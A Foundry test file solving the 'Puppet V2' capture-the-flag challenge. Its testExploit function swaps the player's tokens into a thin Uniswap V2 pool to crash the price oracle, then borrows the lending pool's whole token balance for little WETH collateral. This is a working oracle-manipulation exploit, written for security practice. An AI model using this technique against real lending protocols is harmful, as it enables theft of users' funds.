// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../src/uniswap/Interface.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract PuppetV2Test is Test{
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    address player;
    address deployer;

    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;
    WETH internal weth;
    DamnValuableToken internal token;
    PuppetV2Pool pool;

    function setUp() public {
        player = makeAddr('player');
        deployer = makeAddr('deployer');
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);

        weth = new WETH();
        token = new DamnValuableToken();
        // Deploy Uniswap Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))
            )
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
            )
        );
        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token),
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountETHMin
            0,                                                          // amountETHMin
            address(deployer),                                           // to
            block.timestamp * 2                                        // deadline
        );
        
        pool = new PuppetV2Pool(
            address(weth),
            address(token),
            address(uniswapV2Pair),
            address(uniswapV2Factory)
        );

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(pool), POOL_INITIAL_TOKEN_BALANCE);

        assertEq(pool.calculateDepositOfWETHRequired(1e18), 3e17);
        assertEq(pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300_000e18);
    }

    function testExploit() public {
        /*Code your solution here*/
        vm.startPrank(player);
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        // swap token to weth
        uniswapV2Router.swapExactTokensForTokens(
            PLAYER_INITIAL_TOKEN_BALANCE, // amount in
            1,                            // amount out min
            path,                         // path
            address(player),              // to
            block.timestamp*2             // deadline
        );
        uint256 value = pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        uint256 depositValue = value - weth.balanceOf(address(player));
        weth.deposit{value: depositValue}();
        weth.approve(address(pool), value);
        pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        vm.stopPrank();
        validation();
    }

    function validation() internal {
        assertEq(token.balanceOf(address(pool)), 0);
        assertGe(token.balanceOf(player), POOL_INITIAL_TOKEN_BALANCE);
    }
}